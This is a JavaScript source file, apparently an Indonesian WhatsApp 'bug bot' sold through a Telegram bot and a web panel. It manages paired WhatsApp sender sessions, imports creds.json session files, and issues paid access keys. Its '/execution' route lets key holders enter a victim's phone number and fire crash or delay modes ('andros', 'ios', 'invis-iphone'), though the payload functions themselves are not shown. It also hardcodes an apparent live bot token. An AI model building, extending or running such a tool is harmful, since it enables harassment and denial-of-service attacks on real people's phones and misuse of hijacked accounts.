// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8470763960:AAHlUvROGRN-ob4wFAWJcksmFLqwWuTtR64";
const OWNER_ID = "8234247126";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "AIISIGMA");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command('start', async (ctx) => {
    try {
        const ambilFoto = "https://files.catbox.moe/t5fw19.jpg";
        
        await ctx.replyWithPhoto(ambilFoto, {
            caption: `
⏣ Creator : @sennmods1
⏣ Version : 1.0.0
⏣ League : Asia⧸Bandung

⫹⫺ SPECIFICATION
⏣ Server : Stable
⏣ Security : ✅
⏣ Bug Feature : Added
⏣ Tools Feature : Added

⫹⫺ SETTINGS
⏣ /addbot — 𝖭𝗈𝗆𝗈𝗋
⏣ /listsender
⏣ /delsender — 𝖭𝗈𝗆𝗈𝗋
⏣ /add — 𝖢𝗋𝖺𝖽𝗌.𝗃𝗌𝗈𝗇

⫹⫺ KEY MANAGER
⏣ /ckey — 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾,𝖽𝗎𝗋𝖺𝗌𝗂
⏣ /listkey
⏣ /delkey — 𝗎𝗌𝖾𝗋𝗇𝖺𝗆𝖾

⫹⫺ OWNER MANAGEMENT
⏣ /addacces — 𝖨𝖣
⏣ /delacces — 𝖨𝖣
⏣ /addowner — 𝖨𝖣
⏣ /delowner — 𝖨𝖣
⏣ /setjeda — 1𝗆⧸1𝖽⧸1𝗌`,
            parse_mode: 'HTML',
        });
    } catch (error) {
        console.error('Error sending start message:', error);
        await ctx.reply('❌ Gagal mengirim gambar, silakan coba lagi.');
    }
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn."
    );
  }

  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
  userId,
  '❌ <b>Syntax Error!</b>\n\nGunakan format:\n<code>/ckey User,Day</code>\nContoh:\n<code>/ckey rann,30d</code>',
  { parse_mode: 'HTML' }
);
  }

  const [username, durasiStr] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  const text = [
    `✅ <b>Key berhasil dibuat:</b>\n`,
    `🆔 <b>Username:</b> <code>${username}</code>`,
    `🔑 <b>Key:</b> <code>${key}</code>`,
    `⏳ <b>Expired:</b> ${expiredStr} WIB\n`,
    "<b>Note:</b>\n- Jangan disebar\n- Jangan difreekan\n- Jangan dijual lagi"
  ].join("\n");

  ctx.telegram.sendMessage(userId, text, { parse_mode: "HTML" })
    .then(() => ctx.reply("✅ Success Send Key"))
    .catch(err => {
      ctx.reply("❌ Gagal mengirim key ke user.");
      console.error("Error kirim key:", err);
    });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - Khusus Bang Senn\n—Lu Mau? Beli ke Bang Senn.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

bot.launch();
console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : Twice
AUTHOR      : Senn
TELEGRAM    : https://t.me/sennmods1
CHANEL      : https://t.me/TwiceSen
─────────────────────────────────────\n\n`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
app.use(express.json()); // ⬅️ INI YANG PALING PENTING!
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(bodyParser.json()); // Untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true })); // Yang sudah ada

// Static files (jika ada CSS/JS/images)
app.use(express.static('public'));

// CORS (jika perlu akses dari domain lain)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  // Jika tidak ada session, redirect ke login
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  // Cek apakah user ada dan belum expired
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  // Jika semua pengecekan lolos, lanjut ke route
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios", "andros-delay", "invis-iphone"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        androcrash(sock, target);
      } else if (mode === "ios") {
        Ipongcrash(sock, target);
      } else if (mode === "andros-delay") {
        androdelay(sock, target);
      } else if (mode === "invis-iphone") {
        Iponginvis(sock, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

// ==================== DASHBOARD ROUTE (AiiSigma-X) ==================== //
app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser || Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang ya!");
  }

  const formattedExp = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Twice - Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --bg:#000000; --card:#1a1a1a;
      --text:#ffffff; --muted:#ffffff;
      --primary:#ff0000; --secondary:#AD4AE7;
      --accent:#666666;
    }
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
    body{
      background:radial-gradient(circle at 20% 20%,rgba(255,255,255,.1),transparent 30%),
                 radial-gradient(circle at 80% 10%,rgba(255,255,255,.08),transparent 25%),
                 radial-gradient(circle at 50% 90%,rgba(255,255,255,.05),transparent 30%),
                 var(--bg);
      color:var(--text);min-height:100vh;overflow-x:hidden;
    }
    
.banner-video {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  z-index: 0;
  /* OPTIMIZATION */
  transform: translateZ(0);
  backface-visibility: hidden;
  perspective: 1000;
  will-change: transform;
  /* Reduce motion untuk performa */
  filter: brightness(0.9);
}

   .server-banner {
      border-radius: 15px;
      margin: 20px auto 30px;
      position: relative;
      overflow: hidden;
      min-height: 250px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
      border: 1px solid rgba(255,255,255,0.2);
      transform: translateZ(0);
    }

/* Fallback kalau video error */
.server-banner:has(.banner-video[style*="display: none"]) {
  background: linear-gradient(45deg, #ff0000, #ad4ae7, #000000);
  background-size: 400% 400%;
  animation: gradientShift 8s ease infinite;
}

    /* Overlay tipis biar video tetap kelihatan jelas */
    .server-banner::before {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.3) 100%);
      z-index: 1;
    }

    /* teks ke bawah kiri */
    .banner-content {
      position: absolute;
      bottom: 15px;
      left: 25px;
      z-index: 2;
      text-align: left;
    }

    .banner-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 20px;
      font-weight: 800;
      color: #fff;
      margin-bottom: 5px;
      text-shadow: 0 0 10px rgba(255,255,255,0.5);
    }

    .banner-subtitle {
      font-size: 13px;
      color: var(--text);
      opacity: 0.9;
      margin-bottom: 3px;
    }

    .banner-time {
      color: #ffff;
      font-size: 12px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* status indikator ke kanan bawah */
    .status-indicator {
      position: absolute;
      bottom: 15px;
      right: 25px;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 8px;
      color: #00ff00;
      font-size: 13px;
      font-weight: 600;
      background: rgba(0,0,0,0.4);
      padding: 8px 16px;
      border-radius: 25px;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(0,255,0,0.3);
    }

    /* titik status animasi */
    .status-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #00ff00;
      box-shadow: 0 0 10px #00ff00;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { 
        opacity: 1; 
        box-shadow: 0 0 0 0 rgba(0,255,0,0.7);
      }
      70% { 
        opacity: 0.7; 
        box-shadow: 0 0 0 10px rgba(0,255,0,0);
      }
      100% { 
        opacity: 1; 
        box-shadow: 0 0 0 0 rgba(0,255,0,0);
      }
    }

    /* Menu Toggle Button */
    .menu-toggle {
      position: fixed;
      top: 20px;
      left: 20px;
      background: rgba(255, 255, 255, 0.15);
      border: 1px solid rgba(255,255,255,0.2);
      color: var(--text);
      width: 45px;
      height: 45px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      z-index: 1001;
      backdrop-filter: blur(12px);
      transition: all 0.3s ease;
    }
    
